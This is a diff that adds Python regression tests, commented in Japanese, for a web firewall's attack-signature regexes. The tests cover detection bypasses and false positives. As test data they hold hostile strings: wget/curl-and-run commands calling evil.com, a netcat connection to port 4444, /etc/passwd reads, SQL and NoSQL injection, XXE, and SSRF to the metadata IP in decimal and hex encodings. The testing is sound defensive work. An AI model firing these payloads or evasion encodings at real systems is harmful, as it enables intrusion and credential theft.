@@ -1083,6 +1083,207 @@ def test_dashboard_oversized_body_is_capped():
             FW._FW, ND._SHIELD = ofw, osh
 
 
+def test_b1_rce_and_or_pipe_separator_bypass_is_caught():
+    # ライブ監査で実証された RCE バイパス: rce シグネチャは従来 ';' のみを区切りとして認識し、
+    # '&&'/'||' 連結や nc/bash 以外へのパイプ(curl/wget/sh/python)は素通りしていた。
+    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
+    rce = dict(_SIG_RE)["rce"]
+    for s in ["x=1&&wget http://evil.com/x -O /tmp/a&&chmod +x /tmp/a&&/tmp/a",
+              "x=1|curl http://evil.com/x|sh",
+              "x=1||bash -c id", "x=1&&curl http://evil/x", "x=1|wget http://evil/x",
+              "x=1|python -c 'import os'"]:
+        assert rce.search(_normalize_for_scan(s)), s
+    # 既存の ';' 区切り真陽性は引き続き検知(回帰なし)
+    for s in ["x=1;cat /etc/passwd", "x=1|nc 10.0.0.1 4444", "x=1;bash -c id"]:
+        assert rce.search(_normalize_for_scan(s)), s
+    # プレフィルタが新規バイパス払拭を素通りさせない(自己欺瞞バグの回帰防止)
+    import dataplane.engine.core.accel as accel
+    for s in ["x=1&&wget http://evil.com/x", "x=1|curl http://evil.com/x|sh"]:
+        b = _normalize_for_scan(s)
+        assert accel.prescan_suspicious(b.encode("utf-8")) > 0, s
+
+
+def test_b2_crlf_newline_for_space_bypass_is_caught():
+    # ライブ監査で実証: _normalize_for_scan は生CR/LFを ';' に変換する(空白畳み込みより前)ため、
+    # \s/\s+ 限定の隣接要求を持つ分岐は改行注入で回避できた。区切り文字クラスへ ';' を追加して塞ぐ。
+    from dataplane.engine.lifeform.pipeline import (
+        _normalize_for_scan, _SIG_RE, _xss_event_handler_suspect)
+    rgx = dict(_SIG_RE)
+    assert rgx["sqli"].search(_normalize_for_scan("1;drop\ntable users")), "drop\\ntable"
+    assert rgx["sqli_blind"].search(_normalize_for_scan("1\nwaitfor\ndelay '0:0:5'")), "waitfor\\ndelay"
+    assert rgx["ssi"].search(_normalize_for_scan("x=<!--#\nprintenv -->")), "ssi newline"
+    assert _xss_event_handler_suspect(_normalize_for_scan("<svg\nonload=alert(1)>")), "svg onload newline"
+    assert _xss_event_handler_suspect(_normalize_for_scan("<img src=x\nonload=alert(1)>")), "img onload newline"
+    # 実スペース区切りの既存真陽性は引き続き検知(回帰なし)
+    assert rgx["sqli"].search(_normalize_for_scan("1;drop table users"))
+    assert rgx["sqli_blind"].search(_normalize_for_scan("1;waitfor delay '0:0:5'"))
+    assert rgx["ssi"].search(_normalize_for_scan('x=<!--#exec cmd="id"-->'))
+    assert _xss_event_handler_suspect(_normalize_for_scan("<svg onload=alert(1)>"))
+
+
+def test_b3_nosqli_json_native_operator_form_is_caught():
+    # ライブ監査で実証: Mongo認証バイパスの定番形 {"password":{"$ne":""}} はJSONネイティブの
+    # キー形(コロン付き)で、旧nosqliは配列添字形 [$ne] と bare $where しか見ていなかった。
+    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
+    nosqli = dict(_SIG_RE)["nosqli"]
+    for s in ['{"username":"admin","password":{"$ne":""}}',
+              '{"age":{"$gt":18}}', "{'$or': [{'a':1}]}", '{"x":{"$regex":".*"}}']:
+        assert nosqli.search(_normalize_for_scan(s)), s
+    # 既存の配列添字形/bare $where は回帰なし
+    for s in ["id[$ne]=1", '{"$where":"1==1"}']:
+        assert nosqli.search(_normalize_for_scan(s)), s
+    # 誤検知なし: $ を含まない通常JSON、配列添字(PHP/Railsスタイル)
+    for s in ['{"name":"bob","price":"$19.99"}', "filter[name]=bob", "?items[0]=x"]:
+        assert not nosqli.search(_normalize_for_scan(s)), s
+
+
+def test_b4_xxe_public_external_id_is_caught():
+    # ライブ監査で実証: 標準XMLの PUBLIC 外部識別子形(SYSTEM/<!ENTITY>を含まない)は旧regexの
+    # 両分岐(<!entity / doctype...system)いずれにも当たらず素通りしていた。
+    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
+    xxe = dict(_SIG_RE)["xxe"]
+    assert xxe.search(_normalize_for_scan(
+        '<!DOCTYPE foo PUBLIC "-//X//DTD X//EN" "http://evil.com/x.dtd">')), "PUBLIC external id"
+    # 既存の ENTITY/SYSTEM 形は回帰なし
+    assert xxe.search(_normalize_for_scan('d=<!ENTITY xxe SYSTEM "file:///etc/passwd">'))
+    assert xxe.search(_normalize_for_scan('y=<!DOCTYPE foo SYSTEM "http://evil/x.dtd">'))
+    # 誤検知なし: 引用符を伴わない良性 <!doctype html>
+    assert not xxe.search(_normalize_for_scan("<!doctype html>"))
+
+
+def test_b5_ssrf_decimal_hex_imds_and_expanded_paths_is_caught():
+    # ライブ監査で実証: IMDS IP(169.254.169.254)の10進(2852039166)/16進(0xa9fea9fe)表記は
+    # 同一ホストへ解決されるがバイパスされていた。誤検知回避のため URL authority 位置
+    # (:// または @ の直後)限定。/latest/dynamic・/latest/user-data パスも追加。
+    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
+    ssrf = dict(_SIG_RE)["ssrf"]
+    assert ssrf.search(_normalize_for_scan(
+        "url=http://2852039166/latest/dynamic/instance-identity/document")), "decimal IMDS"
+    assert ssrf.search(_normalize_for_scan("url=http://0xa9fea9fe/latest/meta-data/")), "hex IMDS"
+    assert ssrf.search(_normalize_for_scan("url=http://169.254.169.254/latest/dynamic")), "dynamic path no trailing slash"
+    assert ssrf.search(_normalize_for_scan("url=http://169.254.169.254/latest/user-data")), "user-data path"
+    # 既存の真陽性は回帰なし
+    assert ssrf.search(_normalize_for_scan("url=http://169.254.169.254/latest/meta-data/iam/"))
+    # 誤検知なし: 位置ゲート外の裸の大数値(注文合計/タイムスタンプ等によくある)
+    for s in ["total=2852039166", "ts=0xa9fea9fe", "id=2852039166abc"]:
+        assert not ssrf.search(_normalize_for_scan(s)), s
+
+
+def test_b6_triple_encoded_traversal_is_decoded_and_caught():
+    # ライブ監査で実証: 旧デコード予算は2回固定で、三重(以上)エンコードされた ".." は
+    # 実体の "." まで戻らずtraversalが素通りしていた(ハードコード標的以外は特に)。
+    import tempfile
+    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, NetShield
+    triple_dots = "%25252e%25252e"                 # ".." の三重%エンコード
+    b = _normalize_for_scan(f"f={triple_dots}/{triple_dots}/etc/passwd")
+    assert ".." in b, b                             # 3回のデコードで実体の .. まで戻る
+    # 通常(0〜1回で復号完了)の入力は従来どおり即抜け=低速化しない
+    assert _normalize_for_scan("f=../../etc/passwd") == _normalize_for_scan(
+        "f=%2e%2e/%2e%2e/etc/passwd")
+    # end-to-end: ハードコードされていない標的でも(ハニーポット/固定リテラルに依らず)
+    # traversal シグネチャが発火する(2階層以上のトラバーサルという F5 の要件も満たす形で)。
+    triple_traversal = "%25252e%25252e%2f%25252e%25252e%2fapp%2fsecret_config.yml"
+    with tempfile.TemporaryDirectory() as tmp:
+        sh = NetShield(state_dir=tmp); sh.enable()
+        d = sh.inspect("198.51.100.40", path="/", query="f=" + triple_traversal)
+        assert "traversal" in (d.get("reason") or ""), d
+
+
+def test_f1_scanner_ua_is_scoped_to_user_agent_field_only():
+    # ライブ監査で実証したFP: scanner_ua は本来UA文字列の識別が目的なのに、汎用走査面
+    # (path+query+UA混成/本文)全体に対して判定していたため、bio欄の自由記述
+    # (「nmapやsqlmapに詳しい」等)だけで即403級のスコアが付いていた。
+    import tempfile
+    from dataplane.engine.lifeform.pipeline import NetShield
+    with tempfile.TemporaryDirectory() as tmp:
+        sh = NetShield(state_dir=tmp); sh.enable()
+        # bio欄(query経由)の自由記述はscanner_uaとして扱わない=無スコア
+        d = sh.inspect("203.0.113.10", path="/profile",
+                       query="bio=I'm a penetration tester experienced with nmap, "
+                             "nikto, and sqlmap for security testing")
+        assert d.get("action") == "allow" and float(d.get("score") or 0) == 0.0, d
+        # 本文(body)経由の同様の自由記述もscanner_uaとして扱わない
+        d2 = sh.inspect_body("203.0.113.12",
+                             b"bio=I run nmap and sqlmap daily as part of my job")
+        assert d2.get("action") == "allow", d2
+    # 実際の User-Agent 経由なら引き続き検知(回帰なし=本来のスコープは維持)
+    with tempfile.TemporaryDirectory() as tmp:
+        sh = NetShield(state_dir=tmp); sh.enable()
+        d = sh.inspect("203.0.113.11", path="/", user_agent="sqlmap/1.7")
+        assert "scanner_ua" in (d.get("reason") or ""), d
+
+
+def test_f8_sensitive_path_is_scoped_to_path_field_only():
+    # ライブ監査で実証したFP: sensitive_path は本来「要求されたパスそのもの」が意味を持つのに、
+    # query等の自由記述内の言及(バグ報告「/wp-login.phpにアクセスできない」等)まで拾っていた。
+    import tempfile
+    from dataplane.engine.lifeform.pipeline import NetShield
+    with tempfile.TemporaryDirectory() as tmp:
+        sh = NetShield(state_dir=tmp); sh.enable()
+        d = sh.inspect("203.0.113.20", path="/support",
+                       query="msg=I can't access /wp-login.php on my site anymore, "
+                             "getting a 500 error")
+        assert "sensitive_path" not in (d.get("reason") or ""), d
+    # 実際の path 経由なら引き続き検知(回帰なし)
+    with tempfile.TemporaryDirectory() as tmp:
+        sh = NetShield(state_dir=tmp); sh.enable()
+        d = sh.inspect("203.0.113.21", path="/wp-login.php")
+        assert "sensitive_path" in (d.get("reason") or ""), d
+
+
+def test_f4_information_schema_requires_schema_qualified_reference():
+    # ライブ監査で実証したFP: sqli_blind の information_schema は単発の地の文言及
+    # (「information_schemaを調べたい」)でも発火していた。実SQLiは常にドット修飾で使う
+    # (information_schema.tables 等)ため、それを要求して誤検知を除く。
+    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
+    sqli_blind = dict(_SIG_RE)["sqli_blind"]
+    assert not sqli_blind.search(_normalize_for_scan(
+        "I need help querying information_schema to find all tables "
+        "with a column named user_id")), "bare mention should not match"
+    # 実攻撃(ドット修飾参照)は回帰なし
+    for s in ["' AND (SELECT 1 FROM information_schema.tables LIMIT 1)--",
+              "union select 1 from information_schema.tables",
+              "1 and 1=(select count(*) from information_schema.columns)"]:
+        assert sqli_blind.search(_normalize_for_scan(s)), s
+
+
+def test_f5_traversal_requires_multi_hop_or_hardcoded_target():
+    # ライブ監査で実証したFP: traversal の ../ / ..\ は単発の地の文相対パス言及
+    # (「..\shared\exports\report.csv relative to project root」)でも発火していた。
+    # 実攻撃はほぼ常に複数階層を遡る(../../../../etc/passwd 等)ため2回以上の反復を要求する。
+    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
+    traversal = dict(_SIG_RE)["traversal"]
+    assert not traversal.search(_normalize_for_scan(
+        "The export is at ..\\shared\\exports\\report.csv relative to the project root"
+    )), "single-hop prose mention should not match"
+    assert not traversal.search(_normalize_for_scan(
+        "See ../docs/readme.md for details")), "single-hop unix prose mention should not match"
+    # 実攻撃(多段トラバーサル)は回帰なし
+    for s in ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
+              "../../etc/passwd", "..\\..\\windows\\system.ini"]:
+        assert traversal.search(_normalize_for_scan(s)), s
+    # ハードコード標的リテラル(/etc/passwd 等)は単発の ../ でも従来どおり検知(別分岐で担保)
+    assert traversal.search(_normalize_for_scan("f=/etc/shadow"))
+
+
+def test_f6_lfi_file_scheme_requires_parameter_value_position():
+    # ライブ監査で実証したFP: lfi の file:// は他スキーム(gopher/dict/expect/phar/netdoc)と
+    # 違い、地の文のファイル共有リンク言及で非常に頻繁に出る。パラメータ値位置(= の直後)
+    # 限定にして、地の文言及を除きつつ ?url=file://... 型の実攻撃は捕捉する。
+    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
+    lfi = dict(_SIG_RE)["lfi"]
+    assert not lfi.search(_normalize_for_scan(
+        "Here's the doc: file://fileserver01/shared/reports/q3_summary.pdf"
+    )), "prose file share mention should not match"
+    # 実攻撃(パラメータ値位置)は回帰なし
+    assert lfi.search(_normalize_for_scan("url=file:///etc/passwd"))
+    assert lfi.search(_normalize_for_scan("?target=file://evil/x"))
+    # 他スキームは無条件のまま(=絞り込みの影響を受けない)
+    for s in ["url=gopher://127.0.0.1:6379", "x=dict://h:11211", "x=phar://a",
+              "x=expect://id", "x=netdoc:///etc/passwd", "file=php://filter/resource=x"]:
+        assert lfi.search(_normalize_for_scan(s)), s
+
+
 if __name__ == "__main__":
     fns = [v for k, v in sorted(globals().items())
            if k.startswith("test_") and callable(v)]
